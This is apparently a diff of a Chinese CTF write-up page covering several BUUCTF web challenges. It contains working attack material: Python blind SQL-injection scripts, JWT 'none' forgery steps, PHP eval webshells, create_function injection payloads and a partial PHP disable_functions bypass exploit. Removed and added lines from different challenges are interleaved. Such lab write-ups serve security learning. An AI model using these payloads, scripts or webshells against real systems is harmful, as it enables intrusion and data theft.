-<p>[b01lers2020]Welcome to Earth</p>
-<p>这道题才应该叫套娃</p>
-<p>前几个页面都是查看源代码会给你下一个页面的相对路径，例如</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604215312316.png" alt="image-20240604215312316"></p>
-<p>就不说了</p>
-<p>最后一个界面</p>
-<p>也就是fight</p>
-<p>离谱，是真的离谱</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240604215347316.png" alt="image-20240604215347316"></p>
-<p>前一个函数是flag中的元素位置不断不断转换</p>
-<p>然后最后停止</p>
-<p>也就是说，我们最后就是说会找到一个正确的字符串</p>
-<p>很离谱</p>
-<p>我们努力让他看起来正常一点</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pctf&#123;hey_boys_im_baaaaaaaaaack!&#125;</span><br></pre></td></tr></table></figure>
+<p>所以用data伪协议写进去就好</p>
+<p>payload:</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202102099.png" alt="image-20240620210212072"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;</span><br><span class="line">    extract($_GET[&quot;flag&quot;]);</span><br><span class="line">    echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>牛逼！man！</p>
-<p>[HFCTF2020]EasyLogin</p>
-<p>神奇的题，使我的大脑旋转</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605203717806.png" alt="image-20240605203717806"></p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605203723254.png" alt="image-20240605203723254"></p>
-<p>这俩界面试过了啊</p>
-<p>sql注入和ssti没啥用，不信可以试试，然后告诉我怎么写（请务必这样做）</p>
-<p>所以开始看看源码</p>
-<p>发现了css和js</p>
-<p>一个个点进去看了，发现在app.js里有个东西</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605203934241.png" alt="image-20240605203934241"></p>
-<p>然后？然后就卡住了</p>
-<p>我知道需要进入&#x2F;api&#x2F;flag但是我进不去啊</p>
-<p>所以去查找一下</p>
-<p>发现是koa框架</p>
-<h4 id="koa框架"><a href="#koa框架" class="headerlink" title="koa框架"></a>koa框架</h4><p>koa是一个基于node实现的一个新的web框架，它是由express框架的原班人马打造的。它的特点是优雅、简洁、表达力强、自由度高。它更express相比，它是一个更轻量的node框架，因为它所有功能都通过插件实现，这种插拔式的架构设计模式，很符合unix哲学。</p>
-<p>emm</p>
-<p>暂时别过多了解，脑子烂，会炸</p>
-<p>可以先了解一下它的源码结构&#x2F;文件框架</p>
-<p><img src="https://img-blog.csdnimg.cn/9bdbaa65afb64c2aadf25758ee781e4d.png" alt="img"></p>
-<p>所以，我们使用常见框架去获取一下控制器文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/controllers/api.js</span><br></pre></td></tr></table></figure>
+<p>强比较，可以用数组绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh%61na[]=1&amp;p%61sswd[]=2</span><br></pre></td></tr></table></figure>
 
-<p>发现源代码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const crypto = require(&#x27;crypto&#x27;);</span><br><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line">const jwt = require(&#x27;jsonwebtoken&#x27;)</span><br><span class="line"></span><br><span class="line">const APIError = require(&#x27;../rest&#x27;).APIError;</span><br><span class="line"></span><br><span class="line">module.exports = &#123;</span><br><span class="line">    &#x27;POST /api/register&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || username === &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;register error&#x27;, &#x27;wrong username&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(global.secrets.length &gt; 100000) &#123;</span><br><span class="line">            global.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = crypto.randomBytes(18).toString(&#x27;hex&#x27;);</span><br><span class="line">        const secretid = global.secrets.length;</span><br><span class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;POST /api/login&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;username or password is necessary&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid = JSON.parse(Buffer.from(token.split(&#x27;.&#x27;)[1], &#x27;base64&#x27;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;</span><br><span class="line">            throw new APIError(&#x27;login error&#x27;, &#x27;no such secret id&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret = global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user = jwt.verify(token, secret, &#123;algorithm: &#x27;HS256&#x27;&#125;);</span><br><span class="line"></span><br><span class="line">        const status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/flag&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        if(ctx.session.username !== &#x27;admin&#x27;)&#123;</span><br><span class="line">            throw new APIError(&#x27;permission error&#x27;, &#x27;permission denied&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const flag = fs.readFileSync(&#x27;/flag&#x27;).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#x27;GET /api/logout&#x27;: async (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = null;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status: true</span><br><span class="line">        &#125;)</span><br><span class="line">        await next();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(preg_match(&#x27;/^[a-z0-9]*$/isD&#x27;, $code) || </span><br><span class="line">preg_match(&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;, $arg) ) &#123; </span><br><span class="line">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="line">&#125; else &#123; </span><br><span class="line">    include &quot;flag.php&quot;;</span><br><span class="line">    $code(&#x27;&#x27;, $arg);</span><br><span class="line">&#125; ?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605204918499.png" alt="image-20240605204918499"></p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605204942488.png" alt="image-20240605204942488"></p>
-<p>两个重点列出来</p>
-<p>一个是有关username和password生成jwt</p>
-<p>一个是读取flag的</p>
-<p>我们发现username要等于admin</p>
-<p>登录验证则是jwt</p>
-<p>所以我们应该对于jwt进行破解</p>
-<p>并且是通过hs256加密，我们需要改为加密方式改为none来进行破解</p>
-<p>标题中的alg字段更改为none，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。 此外对于本题中验证采用的密匙<code>secret</code>值也需要为空或者<code>undefined</code>否则还是会触发验证，所以将JWT中<code>secretid</code>项修改为<code>[]</code>。</p>
-<p>所以，我们需要改变的是</p>
-<p>alog、username、secrettid</p>
-<p>我们先进行抓包</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212647168.png" alt="image-20240605212647168"></p>
-<p>那大概率就是说authorzation那个就是我们的jwt的值（因为也是验证身份的，应该是一起上传的）</p>
-<p>去解密一下</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212704207.png" alt="image-20240605212704207"></p>
-<p>拿到了一些重要的信息比如iat</p>
-<p>然后写脚本生成新的jwt</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212804698.png" alt="image-20240605212804698"></p>
-<p>生成了一串东西</p>
-<p>也就是你的新authorization</p>
-<p>之后在登录的时候抓个包修改一下</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240605212949579.png" alt="image-20240605212949579"></p>
-<p>我们就可以以admin的用户进入</p>
-<p>之后再查询api&#x2F;flag路径即可</p>
-<p>[CISCN2019 总决赛 Day2 Web1]Easyweb</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606191525293.png" alt="image-20240606191525293"></p>
-<p>我知道不会是那样，所以就没那样</p>
-<p>你说是吧sql注入</p>
-<p>好吧其实我试过了直接sql注入发现不行</p>
-<p>可恶</p>
-<p>那这道题估计就还是一道气气怪怪的题目</p>
-<p>那就查一查又没有什么特殊文件先</p>
-<p>发现robots.txt</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606192557683.png" alt="image-20240606192557683"></p>
-<p>发现了奇奇怪怪的东西</p>
-<p>xxx的一个备份文件</p>
-<p>我还在想是谁的</p>
-<p>打开源码一看</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606192653870.png" alt="image-20240606192653870"></p>
-<p>这不就来了嘛</p>
-<p>image.php.bak</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=&quot;./&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image/jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
+<p>这里存在**create_function()<strong>注入，而</strong>create_function()**存在两个参数$args和$code。</p>
+<p>所以这里我们保证code传入create_function</p>
+<p>之后是arg参数</p>
+<p>可以使用get_defined_vars()输出所有变量，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[c%6de]=create_function&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
 
-<p>看到源码</p>
-<p>也就是两个参数</p>
-<p>id和path</p>
-<p>后面有几个过滤</p>
-<p>addslashes() 函数返回在预定义的字符前添加反斜杠的字符串。</p>
-<p>预定义字符是：</p>
-<ul>
-<li>单引号（’）</li>
-<li>双引号（”）</li>
-<li>反斜杠（\）</li>
-<li>NULL</li>
-</ul>
-<p>所以第一步是加反斜杠</p>
-<p>第二步是把规定的某些字符串变为空</p>
-<p>然后就是一个sql注入</p>
-<p>还真是sql注入，我承认我之前说话是大声了一点</p>
-<p>所以我们可以大胆猜测我们该怎么做才能注入</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">所以我们要让id变成不识别的，然后将</span><br><span class="line"></span><br><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27;&#123;$path&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<p>所以总payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?deb%75=aq%75a_is_c%75te%0a</span><br><span class="line">&amp;file=data://text/plain,deb%75_deb%75_aq%75a</span><br><span class="line">&amp;sh%61na[]=1&amp;p%61sswd[]=2</span><br><span class="line">&amp;fl%61g[c%6fde]=create_function</span><br><span class="line">&amp;fl%61g[%61rg]=&#125;var_dump(get_defined_vars());//</span><br></pre></td></tr></table></figure>
 
-<p>构造成下面那样差不多吧</p>
-<p>这样的话下面的语句就被分为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from images where id=&#x27;      \&#x27; or path=&#x27;            &#123;$path&#125;&#x27;</span><br></pre></td></tr></table></figure>
+<p>发现</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109204.png"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202109193.png" alt="屏幕截图 2024-06-20 210915"></p>
+<p>重点在最后一句话</p>
+<p><strong>[“ffffffff11111114ggggg”]&#x3D;&gt; string(89) “Baka, do you think it’s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333”</strong></p>
+<p>也就是说，flag在rea1fl4g.php</p>
+<p>访问一下</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202111541.png" alt="image-20240620211146512"></p>
+<p>尝试一下伪协议读取源码放在arg中进行读取</p>
+<p>因为之前过滤太多了，这里直接取反</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=rea1fl4g.php</span><br><span class="line">-&gt;</span><br><span class="line">%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F</span><br></pre></td></tr></table></figure>
 
-<p>也就是说 \ 后面的 ‘ 被转义了，所以闭合情况变了，这样就可以通过传上去的path去搞事情了</p>
-<p>因为没有回显，所以，这里我使用了盲注，脚本如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import  requests</span><br><span class="line">url = &quot;http://9f0a8671-b351-45a7-97ff-d023946ec8da.node5.buuoj.cn:81/image.php?id=\\0&amp;path=&quot;</span><br><span class="line">payload = &quot; or ascii(substr((select username from users),&#123;&#125;,1))&gt;&#123;&#125;%23&quot;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    high = 127</span><br><span class="line">    low = 32</span><br><span class="line">    mid = (low+high) // 2</span><br><span class="line">    # print(mid)</span><br><span class="line">    while(high&gt;low):</span><br><span class="line">        r = requests.get(url + payload.format(i,mid))</span><br><span class="line">       # print(url + payload.format(i,mid))</span><br><span class="line">        if &#x27;JFIF&#x27; in r.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // 2</span><br><span class="line">    result += chr(mid)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fl%61g[%61rg]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br></pre></td></tr></table></figure>
 
-<p>我这里就没有放爆表的情况了</p>
-<p>username和password都要爆</p>
-<p>登录就行</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606201838905.png" alt="image-20240606201838905"></p>
-<p>好好好</p>
-<p>文件上传</p>
-<p>尝试了各种码都没啥用</p>
-<p>最后更改文件名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=@eval($_POST[&#x27;a&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202118606.png" alt="image-20240620211836564"></p>
+<p>base64解码得flag</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202120490.png"></p>
+<p>[GYCTF2020]EasyThinking</p>
+<p>一开始看到我还以为是二次注入呢</p>
+<p>但是尝试之后发现不是</p>
+<p>所以看看wp</p>
+<p>发现是thinkphp框架</p>
+<p>所以先看看是哪个版本</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201922989.png" alt="image-20240620192237924"></p>
+<p><strong>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br>然后再search搜索的内容会直接保存在&#x2F;runtime&#x2F;session&#x2F;目录下</strong></p>
+<p>所以我们注册账号，并在登陆时将session改为32位的php文件</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201947562.png" alt="image-20240620194714529"></p>
+<p>登录之后将在搜索中搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[why]);?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>就行了，反而，七七乖乖的</p>
-<p>应该是直接读取的文件名，反而没有读文件内容，好心理战</p>
-<p>之后就是蚁剑连接拿到flag</p>
-<p>[GYCTF2020]Ezsqli</p>
-<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240606204511024.png" alt="image-20240606204511024"></p>
-<p>做这道题建议屏蔽图片，烦死了</p>
-<p>尝试了一下注入姿势</p>
-<p>发现回显一般只有两种</p>
-<p>Nu1L和Error Occured When Fetch Result.</p>
-<p>也就是如果true返回Nu1L，不是则返回后者</p>
-<p>很经典的布尔盲注题</p>
-<p>之后就是找找过滤</p>
-<p>and被过了</p>
-<p>我们可以使用&amp;&amp;代替</p>
-<p>同时information_schema和mysql.innodb_table_stats被ban了</p>
-<p>搜索后采用sys.x$schema_flattened_keys（仅限5.1以上版本）</p>
-<p>所以我们直接采用脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def get_database(url,strings):</span><br><span class="line">    database_length = 1</span><br><span class="line">    DBname = &#x27;&#x27;</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;id&#x27;: &quot;1&amp;&amp;(length(database()))=&quot;+str(i)</span><br><span class="line">        &#125;</span><br><span class="line">        rs = requests.post(url,data)</span><br><span class="line">        if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">            database_length = i</span><br><span class="line">            print(&#x27;数据库长度为：&#x27;+str(database_length))</span><br><span class="line">            break</span><br><span class="line">    for i in range(1,database_length+1):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: &quot;1&amp;&amp;substr(database(),&quot; + str(i) + &quot;,1)=&#x27;&quot;+str(one_char)+&quot;&#x27;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                DBname = DBname + one_char</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;正在获取数据库名称，当前已获取到&#x27;+str(i)+&#x27;位 | &#x27;+DBname.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def get_tablename(url,strings):</span><br><span class="line">    TBname = &#x27;&#x27;</span><br><span class="line">    print(&#x27;表名字读取中...&#x27;)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;: &quot;1&amp;&amp;substr((select group_concat(table_name) from sys.x$schema_flattened_keys where table_schema=database()),&quot; + str(</span><br><span class="line">                    i) + &quot;,1)=&#x27;&quot;+str(one_char)+&quot;&#x27;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                TBname = TBname + one_char</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;表的名字为：&#x27; + TBname.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line">            if &#x27;Nu1L&#x27; not in rs.text and one_char == &#x27;~&#x27;:</span><br><span class="line">                return &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">def get_column(url,strings):</span><br><span class="line">    column_name = &#x27;&#x27;</span><br><span class="line">    tmp = &#x27;&#x27;</span><br><span class="line">    print(&#x27;\nflag信息读取中...&#x27;)</span><br><span class="line">    for i in range(1, 100):</span><br><span class="line">        for one_char in strings:</span><br><span class="line">            one_char = column_name + one_char</span><br><span class="line">            data = &#123;</span><br><span class="line">                &#x27;id&#x27;:&quot;1&amp;&amp;((select 1,&#x27;&quot;+str(one_char)+&quot;&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))&quot;</span><br><span class="line">            &#125;</span><br><span class="line">            time.sleep(0.05)</span><br><span class="line">            rs = requests.post(url,data)</span><br><span class="line">            if &#x27;Nu1L&#x27; not in rs.text:</span><br><span class="line">                tmp = one_char</span><br><span class="line">            if &#x27;Nu1L&#x27; in rs.text:</span><br><span class="line">                column_name = tmp</span><br><span class="line">                print(&quot;\r&quot;, end=&quot;&quot;)</span><br><span class="line">                print(&#x27;flag为：&#x27; + column_name.lower(), end=&#x27;&#x27;)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://0fe9c88f-4b11-44dc-8d0c-8a792f414c49.node4.buuoj.cn:81/index.php&#x27;</span><br><span class="line">    strings = &#x27;,-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br><span class="line">    get_database(url,strings)</span><br><span class="line">    get_tablename(url,strings)</span><br><span class="line">    #原来是想着获取column名称，但是未获取到，但是又懒得改名称，所以使用的是column</span><br><span class="line">    get_column(url,strings)</span><br></pre></td></tr></table></figure>
+<p>一句话木马上传完毕，这个木马会保存在session文件中</p>
+<p>路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runtime/session/sess_1234567812345678123456781234.php</span><br></pre></td></tr></table></figure>
 
+<p>蚁剑连接</p>
+<p>成功之后我们发现无法读取flag，这里要绕过disable_functions</p>
+<p>上传exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="line">#</span><br><span class="line"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="line">#</span><br><span class="line"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="line">#</span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn(&quot;/readflag&quot;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        